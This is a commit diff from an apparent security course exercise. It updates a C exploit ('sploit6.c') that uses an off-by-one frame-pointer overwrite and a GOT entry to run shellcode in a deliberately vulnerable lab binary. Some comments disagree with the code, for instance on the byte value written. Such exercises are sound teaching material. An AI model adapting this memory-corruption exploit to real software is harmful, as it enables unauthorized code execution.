64ba9ceae922c7c80459331d632d41c569d56b1c
Rafael Moreno Ferrer <rmferrer@gmail.com>
2013-04-08 01:17:05 -0700

    Oops! Last commit was rushed. previous commit for splot6.c targeted target2 and thats why it worked. Exploit 2 does not work verbatim for target 6, a little twirk has to be done.

--- pa/pa1/sploits/sploit6.c
+++ pa/pa1/sploits/sploit6.c
@@ -4,7 +4,7 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target2"
+#define TARGET "/tmp/target6"
 #define STR_SIZE 208 /* size of exploit string */
 
 /* 
@@ -15,11 +15,11 @@
    foo stack frame:
       $fp = 0xBFFFFD68
    bar stack frame:
-      $fp = 0xBFFFFD58
+      $fp = 0xBFFFFD48
    nstrcpy stack frame:
-      $fp = 0xBFFFFC68
+      $fp = 0xBFFFFC58
    
-   start address of buf local var in bar function: 0xBFFFFC90 
+   start address of buf local var in bar function: 0xBFFFFC80 
 */
 
 int main(void)
@@ -30,12 +30,13 @@ int main(void)
   args[0] = TARGET; args[2] = NULL;
   env[0] = NULL;
 
-  long buffAddr, *addrPtr;
+  long buffAddr, gotAddr, *addrPtr;
   char exploitStr[STR_SIZE]; /* string containing exploit code */
   char *ptr;
   int i;
 
-  buffAddr = 0xBFFFFC90; /* start address of buf in target2.c:bar */
+  buffAddr = 0xBFFFFC80; /* start address of buf in target2.c:bar */
+  gotAddr = 0x8049774; /* GOT address for _exit */
 
   /* First, fill the exploit string with the start address of the buf
      in bar. We will set it up such that at some point immediately 
@@ -49,21 +50,25 @@ int main(void)
   
   /* The check 'i <= len' inside the for loop in nstrcpy allows us
      to overwrite the LSB of the saved ebp for the foo stack frame,
-     which is 0xBFFFFD68. This differs only in the LSB with 0xBFFFFD50
+     which is 0xBFFFFD68. This differs only in the LSB with 0xBFFFFD40
      which is an address inside buf. If we overwrite the LSB of the 
-     saved ebp for the foo stack frame to 0x50 then the 'leave' 
+     saved ebp for the foo stack frame to 0x40 then the 'leave' 
      instruction for the bar function call will restore ebp to 
-     0xBFFFFD50. Next, the 'leave' instruction for the foo function 
-     call will set esp to 0xBFFFFD50, pop off 4 bytes to restore a junk
-     ebp and leave esp equal to 0xBFFFFD50. Since the address 
-     0xBFFFFD50 is inside buf, it contains the value 0xBFFFFC90 (the 
+     0xBFFFFD40. Next, the 'leave' instruction for the foo function 
+     call will set esp to 0xBFFFFD40, pop off 4 bytes to restore a junk
+     ebp and leave esp equal to 0xBFFFFD40. Since the address 
+     0xBFFFFD40 is inside buf, it contains the value 0xBFFFFC80 (the 
      start of the buffer) and hence the 'ret' call immediately after 
-     will set eip equal to 0xBFFFFC90. 
+     will set eip equal to 0xBFFFFC80. 
 
      Notice STR_SIZE - 8 is the 201 byte of the exploit string. This
      is exactly the byte that will overwrite the LSB of the saved ebp
      for foo stack frame. */
-  exploitStr[STR_SIZE - 8] = 0x50; 
+  exploitStr[STR_SIZE - 8] = 0x48;
+
+  /* write GOT addr */
+  addrPtr = (long *)&exploitStr[STR_SIZE - 12];
+  *addrPtr = gotAddr; 
 
 
   /* Then fill the first bytes of the exploit string with
